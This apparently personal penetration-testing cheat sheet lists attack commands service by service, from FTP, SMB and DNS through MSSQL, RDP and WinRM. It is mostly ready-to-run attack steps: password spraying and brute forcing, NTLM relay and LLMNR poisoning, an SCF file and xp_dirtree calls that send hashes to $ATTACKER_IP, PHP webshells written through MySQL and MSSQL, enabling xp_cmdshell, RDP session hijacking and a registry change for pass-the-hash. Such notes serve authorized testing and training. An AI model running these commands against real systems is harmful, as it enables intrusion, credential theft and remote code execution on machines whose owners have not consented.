# Attacking Common Services

### Getting IPs of web servers
```shell
for i in $(cat subdomainlist);do host $i | grep "has address" | grep $DOMAIN | cut -d" " -f1,4;donev
```

### Server info using Shodan
```shell
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

### Cloud Enumeration
```shell
python3 o365spray.py --validate --domain $DOMAIN
python3 o365spray.py --enum -U users.txt --domain $DOMAIN
python3 o365spray.py --spray -U usersfound.txt -p '$PASSWORD' --count 1 --lockout 1 --domain $DOMAIN
```

### Tips
Always check for these things:
- Anonymous login
- Misconfigured Access Rights
- Dangerous Default Settings
- Check for CVEs for current version of the service


## FTP

- File Tranfer Protocol, uses TCP Port `21`
- Application layer of the TCP/IP protocol stack
- It is a Clear text protocol and data can be sniffed.
- Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between
client and server processes. It does not provide user authentication and other features supported by FTP.
- Dangerous settings include: anonymous login, file upload, create directory, usage of commands
like `STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE`

```shell
# Download a file
get filename

# Download all available files
wget -m --no-passive ftp://anonymous:anonymous@$IP

# Upload file
put local_filename

# When service is using SSL/TLS
openssl s_client -connect $TARGET_IP:21 -starttls ftp
```

- Attacking FTP:

```shell
# Using nmap scripts
sudo nmap -sC -sV -p 21 $TARGET_IP

# Password brute forcing
medusa -u $USERNAME -P $PASSWORD_FILE -h $IP -M ftp

# FTP Bounce Attack
# An FTP bounce attack is a network attack that uses FTP servers
# to deliver outbound traffic to another device on the network. 
# The attacker uses a PORT command to trick the FTP connection 
# into running commands and getting information from a device
# other than the intended server.
nmap -Pn -v -n -p80 -b anonymous:password@$TARGET_IP $INTERNAL_IP

# FTP directory traversal vulnerability
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


## SSH

```shell
# Footprinting the service
./ssh-audit.py $TARGET_IP

# Try changing authentication method
ssh -v $USERNAME@$TARGET_IP -o PreferredAuthentications=password

# Login
sshpass -p $PASSWORD ssh $USERNAME@$HOST -o StrictHostKeyChecking=no -o PreferredAuthentications=password
```


## SMB

- Server Message Block, uses TCP.
- A client-server protocol that regulates access to files and entire directories and other network resources.
- Access rights are defined by ACLs.
- The ACLs are defined based on the shares and do not correspond to the rights assigned locally on the server.


- Samba implements the Common Internet File System (CIFS) network protocol.
- CIFS is a specific version of SMB.
- When SMB commands are transmitted over Samba to an older NetBIOS service,
connection occur over TCP ports `137, 138, and 139`.
- CIFS operates over TCP port `445` exclusively.
- Dangerous settings include: allow guest to connect, insecure default permissions of files,
logon script, magic script etc

```shell
# Accessing shares using null credentials
smbclient -N -L //$TARGET_IP
crackmapexec smb $TARGET_IP -u '' -p '' --shares
netexec smb $TARGET_IP -u '' -p '' -M spider_plus
smbmap -H $TARGET_IP

# Getting data from the shares
netexec smb $TARGET_IP -u $USER -p $PASS --shares --filter-shares READ WRITE
netexec smb $TARGET_IP -u $USER -p $PASS -M spider_plus

# Enumerating using enum4linux
enum4linux-ng.py $TARGET_IP -A  

# Downloading files
smbmap -H $TARGET_IP -u $USER -p $PASS --download $FILE_PATH
```

```shell
# Enumerating using rpcclient
rpcclient -U "" $TARGET_IP
rpcclient $> srvinfo
rpcclient $> enumdomains
rpcclient $> enumdomusers
rpcclient $> queryuser $RID
rpcclient $> querygroup $GID
rpcclient $> querydominfo
rpcclient $> netshareenumall
rpcclient $> netshareenumall $SHARENAME
```

- Accessing SMB shares from Windows Host

```shell
# Connect to a share 
dir \\$TARGET_IP\ShareName
Get-ChildItem \\$TARGET_IP\ShareName

# Map share to a drive
net use n: \\$TARGET_IP\ShareName
New-PSDrive -Name "N" -Root "\\$TARGET_IP\ShareName" -PSProvider "FileSystem"

net use n: \\$TARGET_IP\ShareName /user:plaintext Password
# Powershell
$username = 'plaintext'
$password = 'Password'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\$TARGET_IP\ShareName" -PSProvider "FileSystem" -Credential $cred

# Useful commands
# Count files
dir n: /a-d /s /b | find /c :\
(Get-ChildItem -File -Recurse | Measure-Object).Count
# Find file using string
dir n:\*cred* /s /b
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

- Accessing SMB Shares from Linux

```shell
# Mount share
sudo mount -t cifs -o username=plaintext,password=Password,domain=. //$TARGET_IP/ShareName /mnt/
```

- Attacking SMB:

```shell
# Using nmap scripts
sudo nmap $TARGET_IP -sV -sC -p139,445
nmap --script smb-vuln* -p 139,445 $TARGET_IP

# RID Brute forcing
samrdump.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP
lookupsid.py guest@$TARGET_IP -no-pass
netexec smb $TARGET_IP -u guest -p '' --rid-brute
```

- Forced Authentication Attacks:
    - LLMNR Poisoning
    - NTLM Relay
    - SCF File Attack

```shell
# LLMNR Poisoning
## Start responder
responder -I <interface name>
## If you receive a hash, crack it
hashcat -m 5600 hash <wordlist>

# NTLM Relay
## Start responder
## Set SMB to OFF in our responder configuration file
## (/etc/responder/Responder.conf)
cat /etc/responder/Responder.conf | grep 'SMB ='
## Then execute impacket-ntlmrelayx 
## By default, impacket-ntlmrelayx will dump the SAM database,
## but we can execute commands by adding the option -c.
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c <command>

# SCF File Attack
## Start responder
## Create an scf file and upload it on
## smb server
[Shell]
Command=2
IconFile=\\$ATTACKER_IP\share\blahblah
[Taskbar]
Command=ToggleDesktop
```

## NFS

```shell
# Footprinting using nmap
sudo nmap $TARGET_IP -p111,2049 --script nfs* -sV -sC

# List available shares
showmount -e $TARGET_IP

# Mount NFS share
mkdir mnt
sudo mount -t nfs $TARGET_IP:/ ./mnt/ -o nolock

# Unmount share
sudo umount ./mnt
```

## DNS

```shell
# NS Query
dig ns $WEBSITE @$DNS_SERVER

# All available records
dig any $WEBSITE @$DNS_SERVER

# Zone transfer
dig axfr $WEBSITE @$DNS_SERVER
dig axfr $SUBDOMAIN.$WEBSITE @$DNS_SERVER
fierce --domain $DOMAIN
```

> If the administrator used a subnet for the allow-transfer option for testing purposes or as a workaround solution or set it to any, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.

> We can use evolution tool as well to access emails. Use this command: export WEBKIT_FORCE_SANDBOX=0 && evolution.

## SMTP

```shell
# Footprinting service
sudo nmap $TARGET_IP -sC -sV -p25

# Open relay testing
sudo nmap $TARGET_IP -p25 --script smtp-open-relay -v

# Username enumeration
smtp-user-enum -M VRFY -U <wordlist> -t $TARGET_IP
```

## IMAP/POP3

```shell
# Footprinting
sudo nmap $TARGET_IP -sV -p110,143,993,995 -sC

# Connecting to IMAP using curl
curl -k 'imaps://$TARGET_IP' --user user:password -v

# Connecting to TLS encrypted POP3 and IMAP
openssl s_client -connect $TARGET_IP:pop3s
openssl s_client -connect $TARGET_IP:imaps
```

- Bruteforcing creds on email services

```shell
hydra -L users.txt -p '$PASSWORD' -f $TARGET_IP pop3
hydra -L users.txt -p '$PASSWORD' -f $TARGET_IP imap
```

## SNMP

```shell
# Fingerprinting
snmpwalk -v2c -c public $TARGET_IP
onesixtyone -c seclists/Discovery/SNMP/snmp.txt $TARGET_IP
braa $community_string@$TARGET_IP:.1.3.6.* 

# Sending an email
swaks --from abc@google.com --to target@google.com --header 'Subject: Test' --body '<message>' --server $TARGET_SERVER_IP

# Brute forcing service
hydra -L users.txt -p '$PASSWORD' -f $TARGET_IP snmp
```

## MySQL

```shell
# Footprinting
sudo nmap $TARGET_IP -sV -sC -p3306 --script mysql*

# Connecting to service
mysql -u user -pPassword -h $TARGET_IP

# Simple commands
- show databases;
- show tables;
- select * from tables;
```

- Read and write local files on server.

```shell
# Write data on a file on web server
mysql> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/webshell.php';

# Read a file
mysql> select LOAD_FILE("/etc/passwd");
```

> In MySQL, a global system variable secure_file_priv limits the effect of data import and export operation. We can check it using: `show variables like "secure_file_priv";`

## MSSQL

```shell
# Footprinting
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET_IP

# Footprinting using MSSQL Ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts $TARGET_IP

# Connecting to service
impacket-mssqlclient $USERNAME@$TARGET_IP
impacket-mssqlclient $USERNAME@$TARGET_IP -windows-auth
```

- Execute commands on mssql server using xp_cmdshell

```shell
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO

-- Run Commands
xp_cmdshell 'whoami'
GO
```

- Read and write files on server.

```shell
# Enable Ole Automation Procedures which requires admin privileges
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

# Create a file
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO

# Read a file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

- Capture MSSQL Service Hash

```shell
# Start responder
sudo responder -I <interface_name>

# Run one of the following commands to get hash
## XP_DIRTREE Hash Stealing
EXEC master..xp_dirtree '\\$ATTACKER_IP\share\'
GO

## XP_SUBDIRS Hash Stealing
EXEC master..xp_subdirs '\\$ATTACKER_IP\share\'
GO
```

- Impersonate Existing Users with MSSQL

> SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

```shell
# Identify Users that We Can Impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

# Verifying our current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

# Impersonating another user and check if they
# are sysadmin
EXECUTE AS LOGIN = '$USERNAME$'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

- Communicate with Other Databases with MSSQL

```shell
# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers
GO

# Run queries on remote server
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [$SERVER_NAME]
GO
```

## Oracle TNS

```shell
# Footprinting
sudo nmap -p1521 -sV $TARGET_IP --open

# SID Bruteforcing
sudo nmap -p1521 -sV $TARGET_IP --open --script oracle-sid-brute

# Enumerating the service
odat.py all -s $TARGET_IP

# If we have creds, login to the service
sqlplus $USER/$PASSWORD@$TARGET_IP/XE
sqlplus $USER/$PASSWORD@$TARGET_IP/XE as sysdba

# File Upload
odat.py utlfile -s $TARGET_IP -d XE -U $USERNAME -P $PASSWORD --sysdba --putFile $DESTINATION $SOURCE

# Simple queries
- select table_name from all_tables;
- select * from table_name;
```

## IPMI

```shell
# Footprinting
sudo nmap -sU --script ipmi-version -p 623 $TARGET_IP

# MSF module
msf6 > use auxiliary/scanner/ipmi/ipmi_version 

# RAKP remote SHA1 password hash retrieval
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
```

## Rsync - Linux

```shell
# Footprinting
sudo nmap -sV -p 873 $TARGET_IP

# Checking accessible shares
nc -nv $TARGET_IP 873

# Enumerating open shares
rsync -av --list-only rsync://$TARGET_IP/$SHARENAME
```

## R-Services - Linux

```shell
# Footprinting
sudo nmap -sV -p 512,513,514 10.0.17.2

# Login using rlogin
rlogin $TARGET_IP -l $USERNAME
# Once logged in, abuse rwho to list interactive sessions
# and rusers to get authenticated users
rwho
rusers -al $TARGET_IP
```

## RDP - Windows

- Enumerating RDP: 

```shell
# Footprinting
nmap -sV -sC $TARGET_IP -p3389 --script rdp*
# Avoiding detection while footprinting
nmap -sV -sC $TARGET_IP -p3389 --packet-trace --disable-arp-ping -n

# Checking RDP security
# git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl $TARGET_IP
```

- Attacking RDP:
    - Password spray
    - Session hijacking
    - Pass the Hash

```powershell
# Password spray
crowbar -b rdp -s $subnet -U users.txt -c $PASSWORD
hydra -L usernames.txt -p $PASSWORD $TARGET_IP rdp

# RDP Session Hijacking
## If we are on a host and have system privileges,
## we can impersonate their session
query user
sc.exe create sessionhijack binpath= "cmd.exe /k tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"
net start sessionhijack

# RDP Pass the Hash
## Restricted Admin Mode, which is disabled by default, should be
## enabled on the target host; otherwise, we will be prompted with
## an error message
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:$TARGET_IP /u:$USER /pth:$HASH
```

## WinRM - Windows

```shell
# Footprinting
nmap -sV -sC $TARGET_IP -p5985,5986 --disable-arp-ping -n

# Connect to the service
evil-winrm -i $TARGET_IP -u $USERNAME -p $PASSWORD
```

## WMI - Windows

```shell
# Footprinting
nmap -sV -sC $TARGET_IP -p135 --disable-arp-ping -n

# Connect to the service
impacket-wmiexec $USERNAME:$PASSWORD@$TARGET_IP
```